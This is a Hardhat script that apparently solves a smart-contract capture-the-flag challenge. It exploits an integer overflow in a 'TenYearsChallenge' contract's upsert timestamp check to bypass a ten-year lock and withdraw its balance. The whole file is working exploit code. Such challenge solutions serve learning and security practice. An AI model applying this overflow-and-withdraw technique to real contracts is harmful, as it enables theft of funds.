import { ethers } from "hardhat";
import hre from 'hardhat'
const helpers = require("@nomicfoundation/hardhat-network-helpers");

// challenge address: <https://bscscan.com/address/0x798238246FD6AFF019bEc52D0D78F1Bc5CC593A8>
async function main() {
  // if(hre.network.name == 'hardhat') {
  //   await helpers.reset("https://bsc.nodereal.io", 26140660);
  // }

  const TenYearsChallenge = await ethers.getContractFactory("TenYearsChallenge");
  const tenYearsChallenge = await TenYearsChallenge.attach('0x798238246FD6AFF019bEc52D0D78F1Bc5CC593A8')

  const balance = await ethers.provider.getBalance(tenYearsChallenge.address);
  console.log(`balance: ${balance}`)
  const queueLenStr = await ethers.provider.getStorageAt(tenYearsChallenge.address, 1)
  const queueLength = parseInt(queueLenStr, 16)
  console.log(`queueLength: ${queueLength}`)

  // set the timestamp to MaxUint256, then the check of next timestamp will overflow, 86400 > MaxUint256 + 1 day
  let tx = await tenYearsChallenge.upsert(ethers.constants.MaxUint256, ethers.constants.MaxUint256)
  await tx.wait();
  tx = await tenYearsChallenge.upsert(ethers.constants.MaxUint256, 86400)
  await tx.wait();
  tx = await tenYearsChallenge.withdraw(queueLength+1)
  await tx.wait();
  console.log("isComplete", await tenYearsChallenge.isComplete())
  const queueLengthAfterWithdrawStr = await ethers.provider.getStorageAt(tenYearsChallenge.address, 1)
  const queueLengthAfterWithdraw = parseInt(queueLengthAfterWithdrawStr, 16)
  console.log(`queueLengthAfterWithdraw: ${queueLengthAfterWithdraw}`)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
